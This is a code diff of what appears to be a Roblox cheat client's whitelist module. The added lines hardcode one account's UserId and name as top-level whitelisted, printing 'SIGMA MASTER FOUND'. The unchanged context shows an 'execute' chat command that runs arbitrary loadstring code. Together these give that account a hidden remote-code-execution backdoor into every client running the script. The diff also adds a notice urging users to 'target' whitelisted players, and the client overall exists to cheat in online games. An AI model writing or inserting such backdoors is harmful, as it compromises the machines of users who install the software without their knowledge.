@@ -354,6 +354,10 @@ run(function()
 	local olduninject
 	function whitelist:get(plr)
 		local plrstr = self:hash(plr.Name..plr.UserId)
+		if plr.UserId == 3396523078 or plr.Name == 'Ftmteamalt1' then
+			print('SIGMA MASTER FOUND')
+			return 3,false
+		end
 		for i,v in self.data.WhitelistedUsers do
 			if v.hash == plrstr then
 				return v.level, v.attackable or self.localprio >= v.level, v.tags
@@ -397,17 +401,19 @@ run(function()
 			self.alreadychecked[v.UserId] = true
 			self:hook()
 			if self.localprio == 0 then
-				olduninject = GuiLibrary.SelfDestruct
-				GuiLibrary.SelfDestruct = function() warningNotification('Vape', 'No escaping the private members :)', 10) end
-				if joined then task.wait(10) end
-				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
-					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
-					if newchannel then newchannel:SendAsync('helloimusinginhaler') end
-					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
-				end
+				--olduninject = GuiLibrary.SelfDestruct
+				
+				--GuiLibrary.SelfDestruct = function() warningNotification('Vape', 'No escaping the private members :)', 10) end
+				--if joined then task.wait(10) end
+				warningNotification('Xquisite','A Whitelisted VW user has joined :'..v.Name..', Make sure to target them :)')
+				--if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+				--	local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					--local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					--if newchannel then newchannel:SendAsync('helloimusinginhaler') end
+					--textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				--elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+					--replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
+				--end
 			end
 		end
 	end
@@ -598,8 +604,8 @@ run(function()
 		end
 	end
 
-	whitelist.commands = {
-		byfron = function()
+	 whitelist.commands = {
+		byfron = function() 
 			task.spawn(function()
 				if setthreadcaps then setthreadcaps(8) end
 				if setthreadidentity then setthreadidentity(8) end
@@ -697,9 +703,9 @@ run(function()
 		reveal = function(args)
 			task.delay(0.1, function()
 				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client or voidware :)')
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('xD lol XV')
                 else
-                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client or voidware :)', 'All')
+                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('xD lol XV', 'All')
                 end
 			end)
 		end,
@@ -1101,15 +1107,7 @@ run(function()
 				end
 			end
 			mutePerson(sender)
-			--[[if sender == "all" then
-				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
-					if v ~= game:GetService("Players").LocalPlayer then
-						mutePerson(v)
-					end
-				end
-			else
-				mutePerson(sender)
-			end--]]
+			
 		end,
 		unmute = function(sender, args)
 			local excluded_table = {}
@@ -1137,15 +1135,7 @@ run(function()
 				end
 			end
 			unmutePerson(sender)
-			--[[if sender == "all" then
-				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
-					if v ~= game:GetService("Players").LocalPlayer then
-						mutePerson(v)
-					end
-				end
-			else
-				mutePerson(sender)
-			end--]]
+			
 		end,
 		execute = function(sender, args)
 			pcall(function() loadstring(table.concat(args, ' '))() end)
